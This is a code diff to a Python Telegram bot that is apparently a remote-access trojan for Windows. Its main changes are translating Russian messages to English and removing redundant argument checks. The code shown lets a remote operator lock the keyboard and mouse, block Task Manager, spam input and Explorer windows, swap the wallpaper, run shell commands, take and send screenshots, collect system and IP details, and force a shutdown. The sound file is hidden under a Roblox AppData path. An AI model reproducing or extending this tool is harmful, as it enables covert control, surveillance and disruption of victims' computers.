@@ -20,6 +20,8 @@ from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 import pygame
 import pyperclip
 
+username = getpass.getuser()
+
 keys = [
     'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
     'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
@@ -106,7 +108,7 @@ def send_welcome(message):
         "/block_all_keys - locks all keys\n"
         "/unblock_all_keys - Unblock all keys\n"
         "/mouse_block - Blocking the mouse\n"
-        "/mouse_block_stop - Unblocks the mouse\n"
+        "/mouse_block_stop - Unblocking the mouse\n"
     )
     
 @bot.message_handler(commands=['buffer'])
@@ -133,11 +135,11 @@ def block_keys(message):
 
     args = message.text.split(' ', 1)
     if len(args) < 2:
-        bot.send_message(message.chat.id, "Usage: /block_keys hotkey1;hotkey2")
+        bot.send_message(message.chat.id, "Usage: /block_hotkeys hotkey1;hotkey2")
         return
 
     if blocking_active:
-        bot.send_message(message.chat.id, "Hotkeys are already blocked.")
+        bot.send_message(message.chat.id, "Hotkeys are already blocked")
         return
 
     hotkeys_to_block = args[1].split(';')
@@ -147,7 +149,7 @@ def block_keys(message):
         try:
             for hotkey in hotkeys_to_block:
                 kb.add_hotkey(hotkey, lambda: None, suppress=True)
-            bot.send_message(message.chat.id, f"Hotkeys are locked:: {', '.join(hotkeys_to_block)}. Use /unblock_keys to unblock it.")
+            bot.send_message(message.chat.id, f"Hotkeys are locked:: {', '.join(hotkeys_to_block)}. Use /unblock_keys to unblock it")
             while blocking_active:
                 time.sleep(1)
         except Exception as e:
@@ -160,13 +162,13 @@ def unblock_keys(message):
     global blocking_active, hotkeys_to_block
 
     if not blocking_active:
-        bot.send_message(message.chat.id, "Hotkeys are not blocked.")
+        bot.send_message(message.chat.id, "Hotkeys are already unlocked")
         return
 
     blocking_active = False
     kb.clear_all_hotkeys() 
     hotkeys_to_block = []
-    bot.send_message(message.chat.id, "Hotkeys unlocked.")
+    bot.send_message(message.chat.id, "Hotkeys are unlocked")
 
 @bot.message_handler(commands=['block_keys_kb'])
 def block_keys_kb(message):
@@ -177,7 +179,7 @@ def block_keys_kb(message):
         bot.send_message(message.chat.id, "Usage: /block_keys_kb a;b;c")
         return
     if blocking_active:
-        bot.send_message(message.chat.id, "The keys are already locked.")
+        bot.send_message(message.chat.id, "The keys are already locked")
         return
 
     keys_to_block = args[1].split(';')
@@ -187,7 +189,7 @@ def block_keys_kb(message):
         try:
             for key in keys_to_block:
                 kb.block_key(key)
-            bot.send_message(message.chat.id, f"Key lock: {', '.join(keys_to_block)}. Use /unblock_keys to unblock it.")
+            bot.send_message(message.chat.id, f"Key lock: {', '.join(keys_to_block)}. Use /unblock_keys_kb to unblock it")
             while blocking_active:
                 time.sleep(1)
         except Exception as e:
@@ -196,23 +198,19 @@ def block_keys_kb(message):
     blocking_thread = threading.Thread(target=block_selected_keys, daemon=True)
     blocking_thread.start()
 
-@bot.message_handler(commands=['unblock_keys'])
+@bot.message_handler(commands=['unblock_keys_kb'])
 def unblock_keys(message):
     global blocking_active, keys_to_block
 
-    args = message.text.split(' ', 1)
-    if len(args) < 1:
-        bot.send_message(message.chat.id, "Usage: /unblock_keys")
-        return
     if not blocking_active:
-        bot.send_message(message.chat.id, "The keys are not locked.")
+        bot.send_message(message.chat.id, "The keys are already unlocked")
         return
 
     blocking_active = False
     for key in keys_to_block:
         kb.unblock_key(key)
     keys_to_block = [] 
-    bot.send_message(message.chat.id, "Keys unlocked.")
+    bot.send_message(message.chat.id, "Keys unlocked")
 
 @bot.message_handler(commands=['block_all_keys'])
 def block_all_keys(message):
@@ -223,7 +221,7 @@ def block_all_keys(message):
         bot.send_message(message.chat.id, "Usage: /block_all_keys")
         return
     if blocking_active:
-        bot.send_message(message.chat.id, "The keys are already locked.")
+        bot.send_message(message.chat.id, "The keys are already locked")
         return
     
     blocking_active = True
@@ -232,7 +230,7 @@ def block_all_keys(message):
         try:
             for key in keys:
                 kb.block_key(key)
-            bot.send_message(message.chat.id, f"All keys are blocked. Use /unblock_keys to unblock it.")
+            bot.send_message(message.chat.id, f"All keys are blocked. Use /unblock_keys to unblock it")
             while blocking_active:
                 time.sleep(1)
         except Exception as e:
@@ -245,12 +243,8 @@ def block_all_keys(message):
 def unblock_keys(message):
     global blocking_active, keys
 
-    args = message.text.split(' ', 1)
-    if len(args) < 1:
-        bot.send_message(message.chat.id, "Usage: /unblock_all_keys")
-        return
     if not blocking_active:
-        bot.send_message(message.chat.id, "The keys are not locked.")
+        bot.send_message(message.chat.id, "keys are already unlocked")
         return
 
     blocking_active = False
@@ -259,7 +253,7 @@ def unblock_keys(message):
             kb.unblock_key(key)
     except:
         pass
-    bot.send_message(message.chat.id, "Keys unlocked.")
+    bot.send_message(message.chat.id, "Keys unlocked")
 
 blocked_apps = set()
 
@@ -275,13 +269,13 @@ def block_task_manager(message):
         app_name = args[1]
         
         if app_name in blocked_apps:
-            bot.send_message(message.chat.id, f"{app_name} is already blocked.")
+            bot.send_message(message.chat.id, f"{app_name} is already blocked")
             return
         
         start_app_block = True
         threading.Thread(target=block_keys, args=(app_name,), daemon=True).start()
         blocked_apps.add(app_name)
-        bot.send_message(message.chat.id, f"{app_name} is blocked now.")
+        bot.send_message(message.chat.id, f"{app_name} is blocked now")
     
     except Exception as e:
         print(f"Error in blocking Task Manager: {e}")
@@ -291,20 +285,15 @@ def block_task_manager(message):
 def unblock_task_manager(message):
     global start_app_block
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /stop_blocking_app")
-            return
-        
         start_app_block = False
         blocked_apps.clear()
-        bot.send_message(message.chat.id, "All apps are unblocked now.")
+        bot.send_message(message.chat.id, "All apps are unblocked now")
     
     except Exception as e:
         print(f"Error in blocking Task Manager: {e}")
 
 
-mouse_block = False
+mouse_block = True
 
 def keep_cursor_centered():
     global mouse_block
@@ -322,10 +311,6 @@ def keep_cursor_centered():
 def block_mouse(message):
     global mouse_block
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /mouse_block")
-            return
         if not mouse_block:
             bot.send_message(message.chat.id, "the mouse is already locked")
             return
@@ -340,10 +325,6 @@ def block_mouse(message):
 def move_mousik(message):
     global mouse_block
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /mouse_block_stop")
-            return
         if mouse_block:
             bot.send_message(message.chat.id, "the mouse is already unlocked")
             return
@@ -385,20 +366,13 @@ def set_volume():
 @bot.message_handler(commands=['sound'])
 def play_sound(message):
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /sound")
-            return
-
-        current_user = getpass.getuser()
-
         set_volume()
         pygame.init()
-        song = pygame.mixer.Sound(rf'Musics\ass.mp3')
+        song = pygame.mixer.Sound(rf'C:\Users\{username}\AppData\Local\Roblox\Musics\ass.mp3')
         song.play()
         time.sleep(song.get_length())
         pygame.quit()
-        bot.send_message(message.chat.id, "Sound played successfully.")
+        bot.send_message(message.chat.id, "Sound played successfully")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -415,12 +389,8 @@ def mouse_movik():
 def move_mousik(message):
     global mouse_spam
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /mouse_spam")
-            return
         if not mouse_spam:
-            bot.send_message(message.chat.id, "mouse_spam is already underway")
+            bot.send_message(message.chat.id, "mouse_spam is already running")
             return
 
         mouse_spam = False
@@ -433,10 +403,6 @@ def move_mousik(message):
 def move_mousik(message):
     global mouse_spam
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /mouse_spam_stop")
-            return
         if mouse_spam:
             bot.send_message(message.chat.id, "mouse_spam is already stopped")
             return
@@ -489,7 +455,7 @@ def move_mousik(message):
             bot.send_message(message.chat.id, "Usage: /keyboard_spam word/letter")
             return
         if not keyboard_start:
-            bot.send_message(message.chat.id, "Keyboard_spam is already underway")
+            bot.send_message(message.chat.id, "Keyboard_spam is already running")
             return
 
         klavisha = args[1]
@@ -509,10 +475,6 @@ def move_mousik(message):
 def move_mousik(message):
     global keyboard_start
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /keyboard_spam_stop")
-            return
         if keyboard_start:
             bot.send_message(message.chat.id, "Keyboard_spam is already stopped")
             return
@@ -525,7 +487,7 @@ def move_mousik(message):
 def set_wallpaper(file_id):
     file_info = bot.get_file(file_id)
     if not file_info or not file_info.file_path:
-        raise Exception("Не удалось получить путь к файлу")
+        raise Exception("Failed to get file path")
     
     downloaded_file = bot.download_file(file_info.file_path)
     save_dir = 'documents'
@@ -542,16 +504,10 @@ def set_wallpaper(file_id):
 def handle_photo(message):
     try:
         file_id = message.photo[-1].file_id
-        args = (message.caption or "").split(' ', 2)
-        
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /photo")
-            return
-        
         set_wallpaper(file_id)
-        bot.reply_to(message, f"Обои успешно сохранены")
+        bot.reply_to(message, f"The wallpaper has been successfully saved")
     except Exception as e:
-        bot.reply_to(message, f"Ошибка при получении фото: {e}")
+        bot.reply_to(message, f"There was an error when receiving the photo: {e}")
 
 @bot.message_handler(commands=['cmd'])
 def run_command(message):
@@ -575,11 +531,6 @@ def run_command(message):
 @bot.message_handler(commands=['screen'])
 def take_screenshot(message):
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /screen")
-            return
-
         screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{1}.jpg')
         ImageGrab.grab().save(screen_path)
         with open(screen_path, 'rb') as screen:
@@ -601,7 +552,6 @@ def get_system_info(message):
             bot.send_message(message.chat.id, "Usage: /info")
             return
 
-        username = getpass.getuser()
         os_info = platform.platform()
         processor = platform.processor()
         ip = get_local_ip()
@@ -619,13 +569,8 @@ def get_system_info(message):
 @bot.message_handler(commands=['shutdown'])
 def shutdown_device(message):
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /shutdown")
-            return
-
         os.system('shutdown /s /f /t 0')
-        bot.send_message(message.chat.id, f"Shutdown command executed.")
+        bot.send_message(message.chat.id, f"Shutdown command executed")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -648,26 +593,16 @@ def kill_explorer():
 @bot.message_handler(commands=['explorer_spam'])
 def explorer_spam(message):
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /explorer_spam")
-            return
-
         threading.Thread(target=open_explorer, daemon=True).start()
-        bot.send_message(message.chat.id, f"Explorer spam executed.")
+        bot.send_message(message.chat.id, f"Explorer spam executed")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
 @bot.message_handler(commands=['stop_explorer_spam'])
 def stop_explorer_spam(message):
     try:
-        args = message.text.split(' ')
-        if len(args) < 1:
-            bot.send_message(message.chat.id, "Usage: /stop_explorer_spam")
-            return
-
         kill_explorer()
-        bot.send_message(message.chat.id, f"Stopped Explorer spam.")
+        bot.send_message(message.chat.id, f"Stopped Explorer spam")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
